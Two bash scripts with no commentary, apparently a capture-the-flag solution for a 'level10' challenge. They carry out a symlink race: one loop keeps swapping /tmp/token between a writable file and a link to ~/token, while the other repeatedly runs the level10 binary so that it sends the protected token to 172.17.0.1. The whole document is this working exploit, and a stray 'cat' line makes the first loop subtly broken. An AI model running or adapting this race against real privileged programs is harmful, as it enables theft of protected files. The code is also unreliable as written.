#!/bin/bash
while true; do
	rm -rf /tmp/token
	touch /tmp/token
    chmod 777 /tmp/token
    rm -rf /tmp/token
    cat
	ln -s ~/token /tmp/token
done


---
#!/bin/bash
while true; do
        ~/level10 /tmp/token 172.17.0.1
done

